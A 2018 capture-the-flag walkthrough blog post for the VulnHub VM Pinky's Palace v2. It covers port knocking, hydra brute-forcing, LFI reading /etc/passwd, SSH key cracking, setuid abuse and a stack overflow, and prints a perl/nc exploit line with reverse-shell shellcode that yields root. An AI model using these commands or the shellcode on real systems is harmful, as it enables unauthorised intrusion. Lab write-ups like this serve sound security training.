---
layout: post
date: 2018-04-29 15:03:40 +0000  
title: "A Dungeon That Happens to Be Pink"
category: Walkthrough
tags: [VulnHub, "Pinky's Palace"]
comments: true
image:
  feature: dice.jpg
  credit: SaeLoveart / Pixabay
  creditlink: https://pixabay.com/en/rpg-game-play-dice-dungeons-468917/
---

This post documents the complete walkthrough of Pinky's Palace: v2, a boot2root [VM][1] created by [Pink_Panther][2] and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

A realistic and ***hellish*** (emphasis mine) boot2root. The objective is to gain access to the system and read `/root/root.txt`. Before we begin, there's an added advantage to map `pinkydb` to the assigned IP address through `/etc/hosts`.

### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in the host:

```
nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT      STATE    SERVICE REASON         VERSION
80/tcp    open     http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown no-response
7654/tcp  filtered unknown no-response
31337/tcp filtered Elite   no-response
```

Alas, only `tcp/80` is open. And no SSH service as there usually is although the rest of the filtered ports may prove interesting later. Who knows?

### Directory/File Enumeration

Let's press on with more enumeration. Using `wfuzz` and `big.txt` from [SecLists](https://github.com/danielmiessler/SecLists) again suggested two WordPress blogs residing in the host and the presence of one very interesting directory `/secret`.

```
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.10.130/FUZZ
Total requests: 20469

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000015:  C=403     11 L	      32 W	    298 Ch	  ".htaccess"
000016:  C=403     11 L	      32 W	    298 Ch	  ".htpasswd"
016077:  C=301      9 L	      28 W	    317 Ch	  "secret"
016215:  C=403     11 L	      32 W	    302 Ch	  "server-status"
019909:  C=301      9 L	      28 W	    320 Ch	  "wordpress"
019949:  C=301      9 L	      28 W	    319 Ch	  "wp-admin"
019953:  C=301      9 L	      28 W	    321 Ch	  "wp-content"
019965:  C=301      9 L	      28 W	    322 Ch	  "wp-includes"
```

There was a text file at `http://pinkydb/secret/bambam.txt`.

```
# curl http://pinkydb/secret/bambam.txt
8890
7000
666

pinkydb
```
### WordPress

Let's use `wpscan` on `pinkydb` to see if we can enumerate things further.

```
# wpscan --url pinkydb --enumerate u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team 
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://pinkydb/
[+] Started: Fri Apr 27 02:19:10 2018
...
[+] Enumerating usernames ...
[+] Identified the following 1 user/s:
    +----+-----------+---------------------+
    | Id | Login     | Name                |
    +----+-----------+---------------------+
    | 1  | pinky1337 | pinky1337 – Pinky's |
    +----+-----------+---------------------+
```

While we are at the blog and coming from past experience where non-English words were spotted, there might be a chance one of those words is a password. Let's build a wordlist with `cewl`.

```
# cewl -m3 pinkydb 2>/dev/null | sed 1d | tee cewl.txt
# john --rules --wordlist=cewl.txt --stdout | tee wordlist.txt
```

Unfortunately, none of the words yielded any results with WordPress.

### Knock Knock. Who's There?

Moving on to `bambam.txt` and if I've to guess, I'd say we are looking at ports (`0-65535`) and that means port-knocking is in the works.

To that end, I wrote a port-knocking script, `knock.sh` using `nmap`.

{% highlight bash linenos %}
#!/bin/bash

TARGET=$1

for ports in $(cat sequence.txt); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
    done
    sleep 3
    nmap -n -v -Pn -p- -A --reason $TARGET -oN ${ports}.txt
done
{% endhighlight %}

Where `sequence.txt` is a text file containing all the permutations of `666,7000,8890` and it can be generated with Python like so.

```
python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq > sequence.txt
```

When the sequence `7000,666,8890` was reached, three additional services were revealed, including the familiar SSH service.

```
./knock.sh 192.168.10.130
[*] Trying sequence 7000,666,8890...
...
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey: 
|   2048 ac:e6:41:77:60:1f:e8:7c:02:13:ae:a1:33:09:94:b7 (RSA)
|   256 3a:48:63:f9:d2:07:ea:43:78:7d:e1:93:eb:f1:d2:3a (ECDSA)
|_  256 b1:10:03:dc:bb:f3:0d:9b:3a:e3:e4:61:03:c8:03:c7 (ED25519)
7654/tcp  open  http    syn-ack ttl 64 nginx 1.10.3
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nginx/1.10.3
|_http-title: 403 Forbidden
31337/tcp open  Elite?  syn-ack ttl 64
| fingerprint-strings: 
|   GetRequest: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
|     HTTP/1.0
|   NULL: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|_    into Pinky's Palace.
```

Now that I've determined the correct sequence to unlock those ports, I could simply use `nmap` to unlock them again.

```
# for p in 7000 666 8890; do nmap -n -v0 -Pn --max-retries 0 -p $p 192.168.10.130; done
```

The service at `tcp/7654` appeared to be running `nginx` while the service at `tcp/31337` appeared to be `echo`ing whatever that's thrown at it.

### Pinky's Database

The page at `http://pinkydb:7654/login.php` revealed a login page to Pinky's database.

![screenshot-1](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-1.png)

Recall the wordlist that we built from WordPress? Perhaps we could use it with `hydra` and see what we get?

```
# echo pinky > usernames.txt
# echo pinky1337 >> usernames.txt
# hydra -L usernames.txt -P wordlist.txt -o hydra.txt -s 7654 pinkydb http-post-form /login.php:user=^USER^&pass=^PASS^:Invalid
[7654][http-post-form] host: pinkydb   login: pinky   password: Passione
[7654][http-post-form] host: pinkydb   login: pinky1337   password: entry
```

We got lucky with `pinky`!

![screenshot-2](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-2.png)

Furthermore, there is a LFI vulnerability with `pageegap.php`. Palindrome anyone?

![screenshot-3](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-3.png)

With that in mind, let's see if we can make use of the vulnerability to display `/etc/passwd`.

```
# curl http://pinkydb:7654/pageegap.php?1337=/etc/passwd
root:x:0:0:root:/root:/bin/bash
...
pinky:x:1000:1000:pinky,,,:/home/pinky:/bin/bash
mysql:x:106:111:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
demon:x:1001:1001::/home/demon:/bin/bash
stefano:x:1002:1002::/home/stefano:/bin/bash
```

Well, it appears that `stefano` has an account in `pinkydb`. On top of that, `stefano` also has his SSH private key seen above. I guess that's an invitation to login to his account via SSH.

Unfortunately, his RSA private key was protected by a password when I tried to login. Nonetheless, using `ssh2john` and `John the Ripper` recovering the password was a piece of cake.

```
# ssh2john id_rsa > id_rsa.hash
# john --show id_rsa.hash 
id_rsa:secretz101
```

With the password out of the way, logging in to `stefano`'s account is almost trivial.

![screenshot-4](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-4.png)

### Privilege Escalation

During enumeration of `stefano`'s account, an executable `/home/stefano/tools/qsub` and a bash script `/usr/local/bin/backup.sh` were observed which I believe were the key pieces to the privilege escalation puzzle.

![screenshot-5](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-5.png)

![screenshot-6](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-6.png)

However, in order to read `/home/stefano/tools/qsub`, I'll need to be `pinky` or `www-data`. Since I don't know `pinky`'s password, the other way would be to see if I could edit any of the `.php` files in `/var/www` (the home directory of `www-data`).

```
$ find /var/www -perm /o+w
/var/www/html/apache/wp-config.php
```

I could edit `wp-config.php` like so and run a reverse shell back to me so that I can at least study `qsub` in greater detail.

![screenshot-7](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-7.png)

![screenshot-8](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-8.png)

I could copy `qsub` encoded in `base64` (shown above) over to my analysis machine and decode it back to the binary form.

![screenshot-9](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-9.png)

Now that `qsub` is on my machine I could perform preliminary reverse engineering and after stepping through the `main()` and `send()` function, the following can be summarized:

* The program `qsub` has one argument - the message to `pinky`
* The input password is less than or equal to 40 characters and is the value of `TERM` environment variable
* The `send()` function is an abstraction for `/bin/echo [Message] >> /home/pinky/messages/stefano_msg.txt`

_`qsub` is comparing the input password with the value of the `TERM` environment variable_

![screenshot-10](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-10.png)

_`system()` library function is used to execute shell command `/bin/echo`_

![screenshot-11](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-11.png)

Since I knew how `qsub` worked and it was `setuid` to `pinky`, I could exploit it to create `/home/pinky/.ssh/authorized_keys` with a RSA key pair I control.

The steps are slightly convoluted but the end result is deeply satisfying:

1. Generate a RSA key pair on my machine
2. Run a `netcat` reverse shell back to me
3. Copy and paste the RSA public key to `/home/pinky/.ssh/authorized_keys`
4. Login to `pinky`'s account with the RSA private key

![screenshot-17](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-17.png)

![screenshot-16](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-16.png)

![screenshot-12](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-12.png)

The objective of gaining control of `pinky`'s account is so that I can edit `/usr/local/bin/backup.sh` and include this line and run a reverse shell back to me as `demon`.

![screenshot-13](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-13.png)

On my machine I've set up a `netcat` listener to receive the reverse shell.

![screenshot-14](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-14.png)

Now, I can use the same Jedi trick of copying over a RSA public key I control, login with SSH and take full control of `demon`'s account, complete with auto-completion and full output control.

![screenshot-15](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-15.png)

But the work is far from done. The final piece of the privilege escalation puzzle is in fact at `/daemon/panel`.

![screenshot-18](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-18.png)

I used `scp` to grab a copy of `/daemon/panel` to my analysis machine (running 64-bit Kali Linux and replicating the conditions of `pinkydb` as closely as possible) where [PEDA](https://github.com/longld/peda) is available and so that I could analyze it with `gdb`. To be more precise, I ran `./panel` and attached `gdb` to it.

![screenshot-19](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-19.png)

As seen above, ASLR was enabled and fortunately, the stack was executable.

Using `readelf`, I spotted the `main()` function along with the `handlecmd()` function which I guessed handles the input provided to the program listening at `tcp/31337`.

![screenshot-20](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-20.png)

Disassembling the function with `gdb`, a breakpoint should be placed at `*handlecmd+70` before control is passed back to the program. It's here where I can analyze the stack overflow and the offset with which to control the RIP.

![screenshot-21](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-21.png)

I created a 200-byte pattern with `pattern_create`, save it to a file and then send it over to `./panel` listening at `tcp/31337`.

![screenshot-22](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-22.png)

The breakpoint at `*handlecmd+70` was hit.

![screenshot-23](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-23.png)

Using the command `pattern_offset` to search for the pattern, the offset can be seen to be at 120 bytes.

![screenshot-24](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-24.png)

The basic exploit structure can then constructed like this.

`# perl -e 'print "A" x 120 . "BBBBBB"'` where `BBBBBB` is the return address yet to be determined.

![screenshot-25](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-25.png)

Here we are, back at the breakpoint. Before is `BBBBBB` returned, noticed the top of the stack? There were 120 `'A'`s followed by `BBBBBB`. If we can find a return address with `jmp rsp` or `call rsp`, we can execute a 120-byte payload placed in the stack. Plenty of space.

![screenshot-26](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-26.png)

Using the command `jmpcall`, we can pinpoint the exact address within `./panel` that has a `call rsp`. This will be our return address.

We can now proceed to generate a payload with `msfvenom`. I've always fancied single-stage reverse shells. 

![screenshot-27](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-27.png)

The generated payload was 119 bytes and fitted in nicely onto the given 120 bytes of space with one byte to spare :smirk:

### Getting to the `root` of the matter

The stage is now set for the real privilege escalation.

`# perl -e 'print "\x90" . "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xd7\x5f\x69\x30\xa9\x2d\x85\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbd\x76\x31\xa9\xc3\x2f\xda\x74\xd6\x01\x66\x35\xe1\xba\xcd\xa7\xd5\x5f\x78\x6c\x69\x85\x8f\x9e\x86\x17\xe0\xd6\xc3\x3d\xdf\x74\xfd\x07\x66\x35\xc3\x2e\xdb\x56\x28\x91\x03\x11\xf1\x22\x80\x6b\x21\x35\x52\x68\x30\x65\x3e\x31\xb5\x36\x07\x1f\xda\x45\x85\x4d\x9f\xd6\x8e\x62\xfe\x65\x0c\xf8\xd8\x5a\x69\x30\xa9\x2d\x85\x1e" . "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337`

On my `netcat` listener, a `root` shell is returned.

![screenshot-28](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-28.png)

With a few more keystrokes to get a better looking shell, the flag is there for the taking.

![screenshot-29](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-29.png)

:dancer:

### Afterthought

Honestly, I thought Pinky's Palace was a misnomer. More like Pinky's Dungeon :sweat_smile: 

Walking through this VM took longer than usual because of the hidden twists and turns. It encouraged me to document the crucial sections meticulously and I certainly took more screen captures. It lived up to its name of being harder than the first one, particularly with the reverse engineering of `qsub` and the exploit development for `panel`.

I must say it was extremely well-designed :+1:

[1]: https://www.vulnhub.com/entry/pinkys-palace-v2,229/
[2]: https://twitter.com/@Pink_P4nther
[3]: https://www.vulnhub.com

*[ASLR]: Address Space Layout Randomization
*[LFI]: Local File Inclusion
*[RSA]: Rivest-Shamir-Adleman
*[SSH]: Secure Shell
